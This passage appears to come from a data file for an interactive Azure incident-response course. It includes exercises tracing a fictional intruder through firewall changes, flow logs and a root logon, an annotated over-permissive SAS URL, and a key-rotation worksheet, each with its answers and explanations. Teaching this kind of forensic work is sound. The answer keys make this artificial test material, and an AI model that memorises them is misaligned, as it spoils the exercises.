            answer: 1,
            why: "Six minutes after the change, the address that made it came through the door it opened. The Activity log proves the rule changed, and only the flow log proves the rule was used. 198.51.100.140 is a scanner that got lucky after the same change, and that matters too: a * source is open to everybody.",
            learned: "The same address connected on port 22 at 02:58:41",
          },
          {
            id: "session",
            ask: "What did that connection turn into on the VM?",
            source: "DeviceLogonEvents · vm-outagemap-02",
            columns: ["Timestamp", "ActionType", "AccountName", "LogonType", "RemoteIP"],
            rows: [
              ["02:58:43", "LogonFailed", "azureuser", "Network", "198.51.100.84"],
              ["08:12:02", "LogonSuccess", "o.brandt", "Network", "10.30.0.12"],
              ["02:58:44", "LogonSuccess", "root", "Network", "198.51.100.84"],
            ],
            answer: 2,
            why: "A root session from the address that held the identity, opened the rule and made the connection. One caller and one address link all three layers into a single intruder's timeline, and everything that identity could reach is now in scope.",
            learned: "A root logon at 02:58:44 ties the change, the traffic and the session to one intruder",
          },
        ],
        primer: {
          title: "Change, then traffic, then session",
          points: [
            "Azure splits an action across layers: the Activity Log has the change, flow logs have the traffic, and the machine's own telemetry has the session.",
            "Pivot on the caller and the address across a wide window, hours to days.",
            "Build the sequence: how they got in, what they looked at, what they changed, what they reached.",
          ],
          example: {
            label: "The same pivot in a smaller story",
            lines: [
              "Change: a storage firewall rule adds 192.0.2.77.",
              "Traffic: 192.0.2.77 appears in StorageBlobLogs ten minutes later.",
              "Reading: the change and the use belong to one line in the timeline.",
            ],
          },
        },
      },
    ],
    // ── Reading 7: SAS tokens ──
    "azure-r7": [
      {
        kind: "anatomy",
        title: "Anatomy of a SAS URL",
        prompt: "One loose end from Monday: the Activity log shows sp-outagemap-deploy listing the keys of rowanoutagesa at 02:36. Linnea turned on StorageRead for rowanoutagesa on Monday, and on Tuesday this URL appeared in the storage logs, from 198.51.100.84, with AuthenticationType SAS. Read what it grants.",
        source: "StorageBlobLogs · Uri · rowanoutagesa",
        fields: [
          { key: "Resource", value: "https://rowanoutagesa.blob.core.windows.net/outage-tiles", label: "Where", note: "The account, then the container." },
          { key: "sv", value: "2023-11-03", label: "Signed version" },
          { key: "ss / srt", value: "b / co", label: "What kind", note: "An account SAS: the blob service, on containers and objects." },
          { key: "sp", value: "rwdl", label: "Permissions", note: "Read, write, delete, list." },
          { key: "se", value: "2029-03-01T00:00:00Z", label: "Expiry", note: "The token's end date." },
          { key: "spr", value: "https", label: "Protocol" },
          { key: "sig", value: "(redacted in the log)", label: "Signature", note: "Computed from the storage account key, away from Azure." },
        ],
        summary: "A SAS, a Shared Access Signature, is a signed set of permissions carried in a URL. Reading it tells you what the holder can do and for how long. Rwdl is more than read, and an expiry years away makes it behave like a long-lived credential. Because an account-key SAS is computed offline, signing it writes no log entry. What you can see is the step before, a listKeys action in the Activity Log, and the step after, token-authenticated requests in the storage logs.",
        primer: {
          title: "SAS tokens in brief",
          points: [
            "A **SAS** grants scoped, time-limited access to storage without sharing the account key.",
            "An **account SAS** or **service SAS** is signed with a storage account key.",
            "A **user delegation SAS** is signed with Entra ID credentials instead.",
            "`StorageBlobLogs` records `AuthenticationType`: `SAS`, `AccountKey`, `OAuth` or `Anonymous`.",
          ],
          example: {
            label: "A narrow one, for comparison",
            lines: [
              "`sr=b&sp=r&se=2026-11-09T18:00:00Z`",
              "Aloud: one blob, read only, for the rest of today.",
            ],
          },
        },
      },
      {
        kind: "worksheet",
        title: "What Breaks If You Rotate key1?",
        prompt: "Rowan's storage account has two keys, and the map depends on some of what's signed with them. With the storm two days out, Linnea wants a list of who gets hurt before the change goes in.",
        caption: "rowanoutagesa · how each consumer authenticates",
        columns: ["Consumer", "Method", "Depends on", "What ends it early"],
        rows: [
          ["Tile renderer", "Account SAS", "key1", "Regenerating key1"],
          ["Map CDN sync", "Connection string", "key1", "Regenerating key1"],
          ["Partner feed", "Service SAS with stored access policy partner-read", "key2", "Deleting the policy, or regenerating key2"],
          ["Report export", "User delegation SAS", "Entra ID", "Revoking the user delegation keys"],
          ["id-outagemap-app", "Entra ID role", "Entra ID", "Removing the role assignment"],
        ],
        questions: [
          { id: "n", q: "How many of these five stop working the moment key1 is regenerated?", hint: "Read the Depends on column.", answer: ["2", "two"], why: "The tile renderer and the CDN sync. Both need a new SAS or connection string in hand first, so the rotation is planned together with whoever owns them. listKeys returned both keys, so key2 gets the same plan next." },
          { id: "alone", q: "Which consumer's SAS can be cancelled on its own, with no key touched?", hint: "Look for a named object that can be deleted.", answer: ["partner feed", "partner", "partner-read"], why: "A stored access policy is a server-side object, so the SAS tied to it can be cancelled by deleting the policy. That's why teams prefer it to a bare account-key SAS." },
          { id: "safe", q: "Does regenerating key1 affect Report export? (yes/no)", hint: "What is it signed with?", answer: ["no"], why: "A user delegation SAS rests on Entra ID, so storage key changes don't touch it. Entra-based access is also tied to a named identity, which makes it easier to audit." },
        ],
      },
    ],
  },
};
